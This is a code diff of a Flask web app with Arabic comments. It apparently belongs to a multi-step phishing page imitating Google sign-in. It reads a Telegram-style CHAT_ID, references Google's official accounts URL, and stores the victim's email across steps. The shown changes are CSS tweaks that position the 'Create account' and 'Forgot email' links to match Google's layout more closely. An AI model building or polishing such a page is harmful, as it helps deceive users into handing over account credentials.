@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: تعديل الارتفاع لتدنيس "إنشاء حساب" للعلامة المطلوبة بالضبط
+# الصفحة الأولى: فصل حاوية "إنشاء حساب" بمسافة واضحة عن رابط "هل نسيت بريدك الإلكتروني"
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -111,14 +111,13 @@ def step1():
         .input-wrapper {
             width: 100%;
             text-align: right;
-            height: 160px; /* زيادة الارتفاع لضمان نزول رابط إنشاء حساب للمكان المطلوب تماماً */
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
         }
 
         .input-group { 
             width: 100%; 
+            margin-bottom: 12px;
         }
         
         .input-group input {
@@ -144,6 +143,7 @@ def step1():
         .signup-container {
             width: 100%;
             text-align: right;
+            margin-top: 24px; /* فصل حاوية إنشاء حساب بمسافة واضحة ومستقلة تماماً عن رابط هل نسيت البريد */
         }
 
         .signup-link {
@@ -219,7 +219,7 @@ def step1():
   )
 
 
-# الصفحة الثانية تبقى كما هي بدون أي تغيير
+# الصفحة الثانية تبقى كما هي
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
